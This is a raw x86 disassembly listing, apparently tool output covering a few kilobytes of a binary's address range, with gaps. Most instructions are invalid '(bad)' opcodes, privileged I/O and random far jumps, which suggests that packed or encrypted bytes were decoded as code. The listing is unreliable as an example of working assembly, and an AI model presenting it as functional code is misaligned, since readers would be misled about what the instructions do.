  41841d:	hlt    
  41841e:	sbb    eax,0x313f8c48
  418423:	mov    ecx,0x67a9272b
  418428:	ret    
  418429:	out    0x6e,eax
  41842b:	sti    
  41842c:	pop    edx
  41842d:	sahf   
  41842e:	cwde   
  41842f:	sbb    dl,BYTE PTR [eax]
  418431:	push   ebp
  418432:	add    al,0x6e
  418434:	inc    edx
  418435:	jmp    0x8d1d90f8
  41843a:	pop    esi
  41843b:	cld    
  41843c:	inc    ebx
  41843d:	imul   esp,DWORD PTR [edi],0x59
  418440:	mov    eax,ds:0xb04ccf23
  418445:	fldenv [eax+0xfddda9e]
  41844b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41844c:	scas   eax,DWORD PTR es:[edi]
  41844d:	mov    BYTE PTR [ecx],dh
  41844f:	xor    esp,DWORD PTR [ebp+0x2cb31a94]
  418455:	mov    ds:0xf199718a,eax
  41845a:	mov    ebx,0x1263ef4a
  41845f:	popa   
  418460:	mov    esi,0x34e1fe1b
  418465:	ja     0x418449
  418467:	dec    edi
  418468:	sbb    eax,0x8e3557da
  41846d:	rol    ebp,cl
  41846f:	or     al,0x2f
  418471:	pop    ds
  418472:	or     al,0x39
  418474:	mov    ebp,0x8f4a1927
  418479:	js     0x41840c
  41847b:	sbb    DWORD PTR [esi+0x6bc0cdb2],ebx
  418481:	cli    
  418482:	sar    DWORD PTR ds:0x56f0e3a0,cl
  418488:	enter  0x480f,0xf4
  41848c:	xchg   esi,eax
  41848d:	int    0x8b
  41848f:	and    al,BYTE PTR [eax]
  418491:	rcl    DWORD PTR ds:0x83b24d67,cl
  418497:	add    ecx,DWORD PTR ds:0xdfa6f528
  41849d:	fs (bad) 
  41849f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184a0:	mov    ds:0x634aa0,al
  4184a5:	data16 (bad) 
  4184a7:	mov    bh,al
  4184a9:	jnp    0x41851b
  4184ab:	lock in eax,0x8f
  4184ae:	mov    ah,BYTE PTR [esi+0x48bfc4a7]
  4184b4:	fstp   DWORD PTR [ebx+0x61]
  4184b7:	mov    DWORD PTR [esp+eiz*2+0x1730a1e],ebx
  4184be:	out    0x47,al
  4184c0:	push   ds
  4184c1:	dec    ebp
  4184c2:	daa    
  4184c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184c4:	add    BYTE PTR es:[ecx-0x33],0x10
  4184c9:	ins    BYTE PTR es:[edi],dx
  4184ca:	or     ecx,edx
  4184cc:	mov    cr2,ebp
  4184cf:	pop    edx
  4184d0:	or     bl,BYTE PTR [eax]
  4184d2:	sub    eax,0xb3b5fe3f
  4184d7:	mov    edx,0xf7c6614e
  4184dc:	jno    0x41851e
  4184de:	mov    ds:0xa18f59a3,al
  4184e3:	mov    BYTE PTR [ebx-0x73],cl
  4184e6:	cmp    esi,edx
  4184e8:	cli    
  4184e9:	sti    
  4184ea:	arpl   WORD PTR [edi+0x382fde76],si
  4184f0:	push   cs
  4184f1:	push   ebx
  4184f2:	mov    ?,WORD PTR [edi+0x4a4a1b7b]
  4184f8:	(bad)  
  4184f9:	mov    esp,0xc673f357
  4184fe:	push   0x65
  418500:	push   edi
  418501:	fucom  st(4)
  418503:	xchg   edi,eax
  418504:	lods   al,BYTE PTR es:[esi]
  418506:	push   ss
  418507:	dec    esi
  418508:	stos   DWORD PTR es:[edi],eax
  418509:	pop    es
  41850a:	mov    al,ds:0x48b0618a
  41850f:	and    edx,0x0
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	(bad)  
  418581:	adc    eax,0x1c7cdcf
  418586:	add    DWORD PTR [eax],eax
  418588:	add    eax,0xcd000001
  41858d:	ja     0x4185e4
  41858f:	mov    ah,0x4a
  418591:	sub    eax,DWORD PTR ds:0x638816ec
  418597:	mov    ah,0x17
  418599:	call   0x16533261
  41859e:	and    DWORD PTR [ebp+0x40],esp
  4185a1:	gs stos DWORD PTR es:[edi],eax
  4185a3:	cmp    dh,BYTE PTR [ebp-0x49]
  4185a6:	in     eax,0xda
  4185a8:	jecxz  0x4185db
  4185aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ab:	xor    eax,0x69813b8e
  4185b0:	ds push ebx
  4185b2:	fdiv   QWORD PTR ds:0x7adb35d1
  4185b8:	retf   0x90ee
  4185bb:	repz es add ebp,eax
  4185bf:	or     BYTE PTR [ebx],0xf0
  4185c2:	jecxz  0x41854e
  4185c4:	jmp    0xee3:0x5c3b5b8f
  4185cb:	sub    DWORD PTR [edi+0xe6f14d9],ebp
  4185d1:	or     eax,0xc844ad3c
  4185d6:	pop    ds
  4185d7:	xchg   esi,eax
  4185d8:	mov    dl,0x37
  4185da:	push   ebx
  4185db:	dec    esi
  4185dc:	loop   0x41856c
  4185de:	mov    DWORD PTR [esi-0x198881f],esi
  4185e4:	cld    
  4185e5:	mov    ebx,0x9300058a
  4185ea:	das    
  4185eb:	gs xchg esp,eax
  4185ed:	repz mov esp,0xd00bacf7
  4185f3:	pop    ds
  4185f4:	gs push 0x6c324a09
  4185fa:	mov    al,ds:0x1e17f96f
  4185ff:	repz sbb DWORD PTR [edx],0xb674d2d3
  418606:	dec    edi
  418607:	mov    dl,0xcf
  418609:	add    ah,bh
  41860b:	mov    ah,BYTE PTR [ecx-0x10a612ee]
  418611:	pushf  
  418612:	dec    edx
  418613:	in     al,0x91
  418615:	xor    eax,0xf76a3ae8
  41861a:	add    ebx,ecx
  41861c:	in     eax,0x91
  41861e:	mov    ?,WORD PTR [ebx-0x63d3108d]
  418624:	enter  0xfa9c,0xcf
  418628:	xor    BYTE PTR [eax-0x158cac78],0x28
  41862f:	or     BYTE PTR [esi],0xe5
  418632:	push   eax
  418633:	pop    ecx
  418634:	out    0x4c,al
  418636:	clc    
  418637:	mov    ah,0x69
  418639:	ins    DWORD PTR es:[edi],dx
  41863a:	popa   
  41863b:	sub    al,0xe3
  41863d:	cdq    
  41863e:	retf   
  41863f:	pusha  
  418640:	call   0x7399eab7
  418645:	cwde   
  418646:	mov    dl,0xc7
  418648:	test   al,0x4f
  41864a:	out    0xf7,eax
  41864c:	inc    esp
  41864d:	loop   0x4186b7
  41864f:	sub    ecx,edx
  418651:	rcr    BYTE PTR [eax],0xc1
  418654:	repz mov bl,0x17
  418657:	das    
  418658:	lods   eax,DWORD PTR ds:[esi]
  418659:	mov    ecx,0x8ad97d51
  41865e:	fild   DWORD PTR [edx-0x5e]
  418661:	fs pop ebp
  418663:	daa    
  418664:	ins    DWORD PTR es:[edi],dx
  418665:	sub    al,BYTE PTR [edx-0x317f7449]
  41866b:	xchg   DWORD PTR [ebx],esi
  41866d:	inc    ebp
  41866e:	cmp    WORD PTR [esi],0x19
  418672:	mov    ds:0x7262c993,al
  418677:	not    DWORD PTR [ecx-0xd]
  41867a:	and    eax,0xf02eff23
  41867f:	push   es
  418680:	adc    al,0x3d
  418682:	push   ecx
  418683:	(bad)  
  418684:	xor    al,0x18
  418686:	pop    ebx
  418687:	push   edx
  418688:	test   eax,ecx
  41868a:	push   ds
  41868b:	gs or  dl,cl
  41868e:	cmp    ebx,0x36
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	xchg   ecx,eax
  418701:	mov    al,0xa
  418703:	mov    ecx,esp
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0xa7000001,al
  41870d:	push   ss
  41870e:	mov    dl,0xea
  418710:	xchg   edx,eax
  418711:	jecxz  0x4186c7
  418713:	pushf  
  418714:	add    DWORD PTR [esi+0x6ed0d200],ebx
  41871a:	push   ecx
  41871b:	mov    ebx,0x792a1698
  418720:	jbe    0x418764
  418722:	push   0xffffffaa
  418724:	cmp    esp,DWORD PTR [edx-0x2eb5739]
  41872a:	dec    esp
  41872b:	adc    DWORD PTR ss:[ecx+0xeab6ec9],0xb1649c47
  418736:	cmp    bh,BYTE PTR [ebx]
  418738:	cmp    DWORD PTR [edi-0x78],ebx
  41873b:	pusha  
  41873c:	loope  0x41870f
  41873e:	mov    bh,0xba
  418740:	loopne 0x418756
  418742:	shl    DWORD PTR [edx+esi*4-0x49b6f08],0x9b
  41874a:	mov    ch,0x21
  41874c:	ja     0x418787
  41874e:	push   cs
  41874f:	ss (bad) 
  418751:	(bad)  
  418752:	mov    DWORD PTR [ecx-0x61385c8f],ebp
  418758:	fwait
  418759:	cmovle esp,esi
  41875c:	adc    esp,ecx
  41875e:	xor    DWORD PTR [ecx-0x1ee505ba],edx
  418764:	dec    ebp
  418765:	call   0x616f:0xd6265865
  41876c:	push   ss
  41876d:	retf   
  41876e:	retf   0x7399
  418771:	cmp    dh,BYTE PTR [edx-0x3c9e243c]
  418777:	push   ecx
  418778:	inc    edi
  418779:	mov    eax,ds:0xbc7c8309
  41877e:	push   es
  41877f:	pop    ds
  418780:	mov    edi,0x48e5bea9
  418785:	and    bh,ah
  418787:	mov    ebx,0x88a82121
  41878c:	push   eax
  41878d:	push   ebp
  41878e:	mov    al,BYTE PTR [ecx]
  418790:	cmp    edx,0x5e326e57
  418796:	nop
  418797:	sbb    al,0xdd
  418799:	icebp  
  41879a:	das    
  41879b:	cwde   
  41879c:	inc    ecx
  41879d:	xchg   esi,eax
  41879e:	pop    edi
  41879f:	and    DWORD PTR [ecx+esi*8],0x8
  4187a3:	jnp    0x4187bb
  4187a5:	xor    al,0x56
  4187a7:	jp     0x4187f9
  4187a9:	int3   
  4187aa:	jb     0x4187a5
  4187ac:	mov    ecx,0xf3fcabe4
  4187b1:	sub    eax,0xc8739be5
  4187b6:	pop    ebp
  4187b7:	(bad)  
  4187b9:	dec    eax
  4187ba:	test   eax,0x20abcaf5
  4187bf:	ins    DWORD PTR es:[edi],dx
  4187c0:	fisttp QWORD PTR [edi]
  4187c2:	push   eax
  4187c3:	shl    DWORD PTR [edi],0x14
  4187c6:	das    
  4187c7:	pop    eax
  4187c8:	dec    esp
  4187c9:	les    esp,FWORD PTR [ecx]
  4187cb:	in     eax,dx
  4187cc:	jbe    0x4187ce
  4187ce:	(bad)  
  4187cf:	shr    DWORD PTR [ebx-0x3226b524],cl
  4187d5:	jl     0x418853
  4187d7:	call   0x9aabade2
  4187dc:	ror    DWORD PTR [esi-0x1d],0xfc
  4187e0:	or     BYTE PTR [eax+0x5bedeaa3],dl
  4187e6:	jbe    0x41882d
  4187e8:	xchg   esp,eax
  4187e9:	fmul   st,st(5)
  4187eb:	into   
  4187ec:	addr16 dec eax
  4187ee:	jl     0x4187ac
  4187f0:	add    eax,0xde92c39a
  4187f5:	(bad)  
  4187f6:	sbb    DWORD PTR [ecx-0x4374c6b8],edi
  4187fc:	gs sub eax,0xad5cf12a
  418802:	lea    esi,[ebx+0x3039b62f]
  418808:	fs push esi
  41880a:	mov    al,0x2a
  41880c:	jnp    0x4187f4
  41880e:	cmp    al,0x6d
  418810:	sldt   WORD PTR [eax]
	...
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi-0x5e63c533]
  418881:	or     DWORD PTR [ebx+0x103d1b7],ebx
  418887:	add    BYTE PTR ds:0x53000001,al
  41888d:	add    DWORD PTR [ecx],esp
  41888f:	rcl    DWORD PTR [ebx-0x5b],0xd5
  418893:	pushf  
  418894:	icebp  
  418895:	push   es
  418896:	xor    BYTE PTR [ebx-0x4769deab],ah
  41889c:	aas    
  41889d:	aam    0xfb
  41889f:	pop    edi
  4188a0:	les    ebx,FWORD PTR [edx]
  4188a2:	mov    ah,bh
  4188a4:	cmp    DWORD PTR [edi-0x61],eax
  4188a7:	dec    esp
  4188a8:	(bad)  
  4188a9:	pusha  
  4188aa:	jp     0x4188d6
  4188ac:	movaps XMMWORD PTR [ebp+0x67],xmm7
  4188b0:	push   ss
  4188b1:	mov    ebp,0x5580525
  4188b6:	xchg   ebp,eax
  4188b7:	std    
  4188b8:	ins    DWORD PTR es:[edi],dx
  4188b9:	ss jmp 0x418909
  4188bc:	aaa    
  4188bd:	imul   esi,DWORD PTR [edx-0x3b386027],0xe13e49d1
  4188c7:	cmp    esi,esi
  4188c9:	repz shr DWORD PTR [esi],1
  4188cc:	jl     0x4188d1
  4188ce:	cmp    eax,0x2d30253
  4188d3:	and    BYTE PTR [esi],ch
  4188d5:	cmp    eax,0x349e42d5
  4188da:	pop    ebx
  4188db:	push   esp
  4188dc:	cs cmc 
  4188de:	scas   eax,DWORD PTR es:[edi]
  4188df:	(bad)  
  4188e0:	popa   
  4188e1:	and    esi,DWORD PTR [edi]
  4188e3:	fistp  DWORD PTR [ebp+0x51754a0f]
  4188e9:	repz jmp DWORD PTR [eax+0x790efc5c]
  4188f0:	mov    ds:0x7b70a902,eax
  4188f5:	jle    0x418929
  4188f7:	fdiv   DWORD PTR [ebx]
  4188f9:	dec    ebp
  4188fa:	arpl   WORD PTR [esi+0x116489bc],cx
  418900:	ret    0x6db2
  418903:	adc    esi,ebx
  418905:	add    BYTE PTR [ebx-0x719af93d],cl
  41890b:	sbb    al,dl
  41890d:	or     dl,BYTE PTR [esi+0x6a]
  418910:	fs hlt 
  418912:	pop    eax
  418913:	(bad)  
  418914:	mov    eax,0xd2082b00
  418919:	add    BYTE PTR [esi],dl
  41891b:	popa   
  41891c:	into   
  41891d:	fisubr DWORD PTR [edi+0x5c]
  418920:	bts    DWORD PTR ds:0x109487d6,ebp
  418927:	test   al,0x4f
  418929:	adc    BYTE PTR [ecx],bh
  41892b:	rol    DWORD PTR [esp+ecx*8],1
  41892e:	fldenv ds:0x852150cf
  418934:	jp     0x41898a
  418936:	and    eax,0x5047541d
  41893b:	lds    edx,FWORD PTR [esi-0x78d6a1bc]
  418941:	dec    ecx
  418942:	mov    esi,0x4ed3182e
  418947:	dec    ecx
  418948:	jmp    FWORD PTR [edi+0x79]
  41894b:	cmp    BYTE PTR [ecx-0x2b05460c],ah
  418951:	loopne 0x4188f8
  418953:	push   ds
  418954:	mov    eax,ss
  418956:	or     eax,0xbe8243a4
  41895b:	mov    ecx,0xc2bb25e1
  418960:	xor    eax,0x8d94fbf2
  418965:	cmp    ecx,esi
  418967:	jmp    0x8f7b:0xade479e5
  41896e:	mov    al,ds:0xe27d1d44
  418973:	mov    al,ds:0x6d364450
  418978:	int    0xc7
  41897a:	push   ecx
  41897b:	jbe    0x418972
  41897d:	jge    0x41899a
  41897f:	mov    ch,0x64
  418981:	ret    0xdf0f
  418984:	add    bh,BYTE PTR [ebp+0x683b5d5a]
  41898a:	add    eax,DWORD PTR [esi+0x14ed668b]
  418990:	loopne 0x418992
	...
  4189f2:	add    BYTE PTR [eax],al
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xd9751769
  418a03:	cmp    dl,dh
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0x6c000001,al
  418a0d:	aad    0xc5
  418a0f:	sahf   
  418a10:	lods   al,BYTE PTR ds:[esi]
  418a11:	aaa    
  418a12:	int    0x9
  418a14:	jmp    0x4189d9
  418a16:	push   es
  418a17:	mov    ecx,0x528bba40
  418a1c:	stos   BYTE PTR es:[edi],al
  418a1d:	jo     0x418a86
  418a1f:	cmc    
  418a20:	adc    al,0xc7
  418a22:	push   cs
  418a23:	and    eax,0x6ea42195
  418a28:	xchg   ecx,eax
  418a29:	mov    al,ds:0x1ddbca87
  418a2e:	sti    
  418a2f:	or     DWORD PTR [edx+0x15d90853],eax
  418a35:	cwde   
  418a36:	out    dx,al
  418a37:	pop    eax
  418a38:	xchg   ecx,eax
  418a39:	pop    esi
  418a3a:	shl    BYTE PTR [edx+0x74],1
  418a3d:	xchg   esp,eax
  418a3e:	or     ah,cl
  418a40:	sar    BYTE PTR [edi+eax*1+0x1c619543],cl
  418a47:	mov    ebp,0x2dc4ca72
  418a4c:	pop    esp
  418a4d:	xchg   esi,eax
  418a4e:	push   0xffffffe2
  418a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a51:	dec    edx
  418a52:	add    DWORD PTR [ecx-0x3d],ecx
  418a55:	mov    ds,WORD PTR cs:[ebx]
  418a58:	fadd   DWORD PTR [ebp-0x14]
  418a5b:	out    0x65,eax
  418a5d:	pop    esp
  418a5e:	leave  
  418a5f:	xchg   ebx,eax
  418a60:	jne    0x418ab3
  418a62:	(bad)
  418a65:	test   eax,0x3d11fb59
  418a6a:	push   ecx
  418a6b:	jns    0x418aba
  418a6d:	cmp    DWORD PTR [edi-0x7511010d],ebx
  418a73:	mov    ds:0x4125e90e,eax
  418a78:	dec    ebx
  418a79:	pop    ebx
  418a7a:	sub    edx,DWORD PTR [edi+edi*8-0x705bf43c]
  418a81:	(bad)  
  418a82:	xor    eax,0x83d391bf
  418a87:	imul   ecx,esi,0xa32ad82c
  418a8d:	les    ecx,FWORD PTR [edx-0x2a]
  418a90:	out    0x38,al
  418a92:	in     eax,0x64
  418a94:	div    DWORD PTR [ecx]
  418a96:	push   0xffffffe5
  418a98:	sbb    al,0xb8
  418a9a:	add    BYTE PTR ds:0x2a79665d,0x73
  418aa1:	outs   dx,DWORD PTR ds:[esi]
  418aa2:	dec    esp
  418aa3:	jp     0x418ad8
  418aa5:	(bad)  
  418aa6:	les    esi,FWORD PTR [edx]
  418aa8:	ror    DWORD PTR ds:0x8fefb8a7,cl
  418aae:	cmp    BYTE PTR [ecx-0x11aa6c49],dl
  418ab4:	fs mov esi,edi
  418ab7:	sub    ebx,DWORD PTR ds:0x1a000583
  418abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418abe:	lea    esi,ds:0xa0c59b41
  418ac4:	or     DWORD PTR [edx+0xa302ab3],ebp
  418aca:	imul   edx,DWORD PTR [edx-0x638a10a],0xe5da2417
  418ad4:	rol    DWORD PTR [ebx+0x52],0xd1
  418ad8:	popf   
  418ad9:	xor    edx,ecx
  418adb:	lods   eax,DWORD PTR ds:[esi]
  418adc:	icebp  
  418add:	and    cl,al
  418adf:	pop    ss
  418ae0:	jmp    0xda53:0x8d124262
  418ae7:	repnz hlt 
  418ae9:	cmp    BYTE PTR [ecx],cl
  418aeb:	xchg   bl,bh
  418aed:	repnz sbb al,0xf3
  418af0:	sub    dh,BYTE PTR [edx]
  418af2:	mov    eax,0x78857d36
  418af7:	xchg   ebp,eax
  418af8:	push   edx
  418af9:	mov    fs,WORD PTR [ebp-0x6]
  418afc:	sub    BYTE PTR [edi-0x60],cl
  418aff:	(bad)  
  418b00:	cmp    ch,dl
  418b02:	dec    edi
  418b03:	add    DWORD PTR [eax-0x33bdd807],eax
  418b09:	aad    0xc1
  418b0b:	and    al,0x32
  418b0d:	pop    ebx
  418b0e:	(bad)  
  418b0f:	xor    al,0x97
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xc6
  418b81:	or     edi,DWORD PTR [eax-0x2e]
  418b84:	fild   DWORD PTR ds:0x1050001
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	dec    edi
  418b8d:	sbb    al,0x1b
  418b8f:	push   0x72d4fb83
  418b94:	(bad)  
  418b95:	mov    dh,BYTE PTR [ecx]
  418b97:	aaa    
  418b98:	js     0x418b67
  418b9a:	jb     0x418b5a
  418b9c:	cld    
  418b9d:	aas    
  418b9e:	xor    al,0x45
  418ba0:	je     0x418b7a
  418ba2:	or     al,0x6f
  418ba4:	adc    eax,0x4bd37fd6
  418ba9:	pushf  
  418baa:	sti    
  418bab:	mov    al,ds:0xb09ebb46
  418bb0:	jae    0x418b8b
  418bb2:	popf   
  418bb3:	cmp    dl,BYTE PTR [ebx+ecx*8]
  418bb6:	xor    ecx,ecx
  418bb8:	pop    edx
  418bb9:	jo     0x418b4c
  418bbb:	dec    ebp
  418bbc:	pop    esp
  418bbd:	mov    al,ds:0x1fa2a0e9
  418bc2:	out    0xea,al
  418bc4:	mov    ds:0xe95a4dd7,eax
  418bc9:	ja     0x418b77
  418bcb:	push   ecx
  418bcc:	aas    
  418bcd:	fld    QWORD PTR [ebp+edx*2+0x6eb6b30f]
  418bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd5:	jecxz  0x418bd2
  418bd7:	sbb    eax,0x432e7703
  418bdc:	push   0xffffffa4
  418bde:	(bad)  
  418bdf:	(bad)  
  418be0:	fistp  QWORD PTR [ebx-0x7e]
  418be3:	fst    DWORD PTR [ecx+0x16cc50ec]
  418be9:	cmp    eax,0xdc98926
  418bee:	dec    ebx
  418bef:	je     0x418c14
  418bf1:	dec    edi
  418bf2:	mov    ebx,DWORD PTR [edi]
  418bf4:	out    dx,al
  418bf5:	int3   
  418bf6:	mov    ebp,0xabe67f8
  418bfb:	pop    edx
  418bfc:	mov    bl,0x83
  418bfe:	adc    dl,ah
  418c00:	icebp  
  418c01:	jae    0x418bbb
  418c03:	mov    dl,0x2e
  418c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c06:	ins    DWORD PTR es:[edi],dx
  418c07:	jl     0x418c1f
  418c09:	fs int3 
  418c0b:	lahf   
  418c0c:	dec    edx
  418c0d:	std    
  418c0e:	fidivr DWORD PTR [eax]
  418c10:	bound  esi,QWORD PTR [edx+0x3adaeb39]
  418c16:	mov    bl,0x34
  418c18:	xchg   esp,eax
  418c19:	jnp    0x418bf8
  418c1b:	sbb    ah,dl
  418c1d:	xor    edx,DWORD PTR [eax+0x5b752b56]
  418c23:	add    DWORD PTR [eax+0x70],ecx
  418c26:	inc    eax
  418c27:	push   0xffffff8c
  418c29:	dec    eax
  418c2a:	into   
  418c2b:	(bad)  
  418c2c:	test   DWORD PTR [ecx],0x246a365c
  418c32:	xor    dh,dh
  418c34:	int    0x54
  418c36:	inc    edi
  418c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c38:	inc    edi
  418c39:	ror    edi,0xf4
  418c3c:	bound  esp,QWORD PTR [ebx-0xf89158]
  418c42:	dec    edx
  418c43:	mov    bl,0x77
  418c45:	xchg   edi,eax
  418c46:	jmp    0xdc01:0x33df69c
  418c4d:	push   esi
  418c4e:	gs scas eax,DWORD PTR es:[edi]
  418c50:	out    dx,eax
  418c51:	fs push 0x4a
  418c54:	inc    ebp
  418c55:	sahf   
  418c56:	mov    ds:0x692a990b,eax
  418c5b:	sub    al,0x46
  418c5d:	cmp    ebp,edx
  418c5f:	cmp    al,0xcf
  418c61:	ins    BYTE PTR es:[edi],dx
  418c62:	jmp    0x418c0e
  418c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c65:	mov    ds:0x94c8f4e2,al
  418c6a:	out    dx,eax
  418c6b:	scas   eax,DWORD PTR es:[edi]
  418c6c:	push   ebx
  418c6d:	push   ss
  418c6e:	fdivr  DWORD PTR [edi+0x1341f983]
  418c74:	in     al,0x1c
  418c76:	gs jge 0x418c47
  418c79:	add    eax,DWORD PTR [ebx+0x24a4947d]
  418c7f:	loope  0x418c7a
  418c81:	jmp    0x2742:0x440ce133
  418c88:	push   ebp
  418c89:	pop    ss
  418c8a:	sub    bh,dl
  418c8c:	mov    al,ds:0x3bdefa8c
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	sar    BYTE PTR [eax-0x1fe44324],cl
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x6a000001
  418d0d:	xor    ecx,ebx
  418d0f:	clc    
  418d10:	call   0x69c8:0x43f2d823
  418d17:	dec    edi
  418d18:	mov    DWORD PTR [esi+eax*2],ebx
  418d1b:	pop    ds
  418d1c:	test   ecx,ebx
  418d1e:	fist   WORD PTR [edx-0x55]
  418d21:	outs   dx,BYTE PTR ds:[esi]
  418d22:	les    edi,FWORD PTR [ebx]
  418d24:	pop    ds
  418d25:	inc    ecx
  418d26:	or     BYTE PTR [edi],dh
  418d28:	or     eax,0xc655917
  418d2d:	out    0x28,eax
  418d2f:	(bad)  
  418d31:	pop    eax
  418d32:	and    DWORD PTR [edi],0xbcd72f72
  418d38:	and    esi,eax
  418d3a:	pop    ebp
  418d3b:	ins    DWORD PTR es:[edi],dx
  418d3c:	icebp  
  418d3d:	(bad)  
  418d3e:	cwde   
  418d3f:	mov    esp,DWORD PTR [ebx-0x6e]
  418d42:	repz pop ebx
  418d44:	in     eax,dx
  418d45:	das    
  418d46:	push   ebx
  418d47:	cmp    ebp,DWORD PTR [eax+0x5b39c839]
  418d4d:	add    eax,0x479564b0
  418d52:	and    DWORD PTR [ebp+0x747bd339],ecx
  418d58:	pop    eax
  418d59:	or     eax,0x2350676f
  418d5e:	jne    0x418d05
  418d60:	jmp    0xdb6d7789
  418d65:	cld    
  418d66:	sahf   
  418d67:	and    DWORD PTR [eax-0x3f4829f4],esi
  418d6d:	sbb    al,0x41
  418d6f:	inc    ebp
  418d70:	(bad)  
  418d71:	mov    WORD PTR [eax],es
  418d73:	cmp    dl,bh
  418d75:	pop    ds
  418d76:	mov    eax,ds:0x367b874f
  418d7b:	cmc    
  418d7c:	inc    esi
  418d7d:	lods   eax,DWORD PTR ds:[esi]
  418d7e:	fwait
  418d7f:	or     al,0x7f
  418d81:	jp     0x418d07
  418d83:	inc    ecx
  418d84:	xchg   ebp,eax
  418d85:	daa    
  418d86:	les    edi,FWORD PTR [ecx]
  418d88:	repnz pushf 
  418d8a:	cld    
  418d8b:	shl    BYTE PTR [ebp+0x7a],0x30
  418d8f:	mov    ds:0x2f84cd01,al
  418d94:	lods   eax,DWORD PTR ds:[esi]
  418d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d96:	cmp    BYTE PTR [edi],dh
  418d98:	(bad)  
  418d99:	dec    esp
  418d9a:	aas    
  418d9b:	daa    
  418d9c:	mov    eax,ds:0xc74f8ce4
  418da1:	outs   dx,DWORD PTR ds:[esi]
  418da2:	dec    eax
  418da3:	(bad)  
  418da5:	sar    DWORD PTR ds:0xe5ca587c,1
  418dab:	inc    esp
  418dac:	pop    ds
  418dad:	dec    edi
  418dae:	out    dx,eax
  418daf:	enter  0x29e,0xfa
  418db3:	in     al,dx
  418db4:	mov    esi,0x1097b5c0
  418db9:	xchg   esp,eax
  418dba:	(bad)  
  418dbb:	mov    edi,0x1be43ffd
  418dc0:	pop    ds
  418dc1:	ret    
  418dc2:	not    DWORD PTR [ebp+0x5e]
  418dc5:	cmp    ebx,esi
  418dc7:	dec    ebx
  418dc8:	nop
  418dc9:	ss push ss
  418dcb:	nop
  418dcc:	jmp    0xd067ae69
  418dd1:	fimul  WORD PTR [ebp-0xd37a8bc]
  418dd7:	jne    0x418dbc
  418dd9:	bound  esi,QWORD PTR ds:0x92a9fee7
  418ddf:	ja     0x418dbc
  418de1:	dec    ecx
  418de2:	mov    eax,ds:0x8014cadb
  418de7:	adc    DWORD PTR [ecx+esi*4],ecx
  418dea:	lock pop esi
  418dec:	jmp    0x8dad:0x7a0537d5
  418df3:	mov    esp,0x5fbaa9c9
  418df8:	dec    ecx
  418df9:	test   eax,0x7a063a9d
  418dfe:	mov    cl,0xf5
  418e00:	stos   DWORD PTR es:[edi],eax
  418e01:	shr    BYTE PTR [edi+0x20229367],0x9e
  418e08:	je     0x418e78
  418e0a:	ins    DWORD PTR es:[edi],dx
  418e0b:	sti    
  418e0c:	ror    BYTE PTR [ecx-0x6a],cl
  418e0f:	int3   
  418e10:	jg     0x418e12
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x1b]
  418e81:	repz (bad) 
  418e83:	enter  0x7e5,0x1
  418e87:	add    BYTE PTR ds:0x42000001,al
  418e8d:	add    al,0x49
  418e8f:	mov    bl,BYTE PTR [edi-0x386996a6]
  418e95:	out    dx,eax
  418e96:	cmp    al,0xaf
  418e98:	xchg   esi,eax
  418e99:	in     eax,dx
  418e9a:	xchg   edx,eax
  418e9b:	int3   
  418e9c:	push   ebx
  418e9d:	sti    
  418e9e:	mov    ch,0x64
  418ea0:	jmp    0x3af7943
  418ea5:	clc    
  418ea6:	sbb    al,0x9d
  418ea8:	cwde   
  418ea9:	(bad)  
  418eaa:	mov    dl,0x8
  418eac:	jmp    0x418e53
  418eae:	push   0xe64b1343
  418eb3:	in     eax,dx
  418eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eb5:	mov    BYTE PTR [ecx-0x37],ah
  418eb8:	push   ds
  418eb9:	stos   BYTE PTR es:[edi],al
  418eba:	sar    BYTE PTR fs:[ebp+0x6f8bbe16],cl
  418ec1:	(bad)  
  418ec2:	pop    esi
  418ec3:	sbb    edx,0xffffffea
  418ec6:	jmp    0x3d3ca69b
  418ecb:	inc    edi
  418ecc:	sti    
  418ecd:	jg     0x418efa
  418ecf:	jp     0x418ed1
  418ed1:	cld    
  418ed2:	mov    WORD PTR [esi+0x2258e479],es
  418ed8:	adc    bl,BYTE PTR [ecx+0x6f]
